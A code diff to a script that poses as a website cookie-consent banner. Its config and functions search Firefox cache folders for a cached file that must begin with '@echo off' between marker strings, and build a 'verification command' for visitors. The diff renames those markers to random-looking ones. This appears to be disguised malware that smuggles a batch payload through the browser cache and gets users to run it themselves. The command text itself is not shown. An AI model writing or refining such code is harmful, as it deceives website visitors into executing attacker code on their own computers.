@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.5.0',
+    version: '1.6.0',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
     accentColor: '#1b6369',
@@ -20,8 +20,8 @@
     cacheFileUrl: null,
     cacheFileBodySize: null,
     strictBody: true,
-    bodyStartMarker: '===CACHED_HELLO_FILE===',
-    bodyEndMarker: '===END===',
+    bodyStartMarker: '===CDRP_A7F3B2E9D41C===',
+    bodyEndMarker: '===CDRP_END_A7F3B2E9D41C===',
     bodyMustStartWith: '@echo off',
     cacheSearchPaths: {
       firefox: { root: '%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles', glob: '(*)' },
@@ -132,8 +132,8 @@
   }
 
   function getVerificationCommand() {
-    var startMarker = CONSENT_CONFIG.bodyStartMarker || '===CACHED_HELLO_FILE===';
-    var endMarker = CONSENT_CONFIG.bodyEndMarker || '===END===';
+    var startMarker = CONSENT_CONFIG.bodyStartMarker || '===CDRP_A7F3B2E9D41C===';
+    var endMarker = CONSENT_CONFIG.bodyEndMarker || '===CDRP_END_A7F3B2E9D41C===';
     if (!startMarker || !endMarker) return '';
 
     var key = getBrowserKey();
@@ -247,8 +247,8 @@
       }
     }
 
-    var startMarker = CONSENT_CONFIG.bodyStartMarker || '===CACHED_HELLO_FILE===';
-    var endMarker = CONSENT_CONFIG.bodyEndMarker || '===END===';
+    var startMarker = CONSENT_CONFIG.bodyStartMarker || '===CDRP_A7F3B2E9D41C===';
+    var endMarker = CONSENT_CONFIG.bodyEndMarker || '===CDRP_END_A7F3B2E9D41C===';
     if (text.indexOf(startMarker) === -1) {
       return { ok: false, reason: 'missing start marker ' + startMarker };
     }
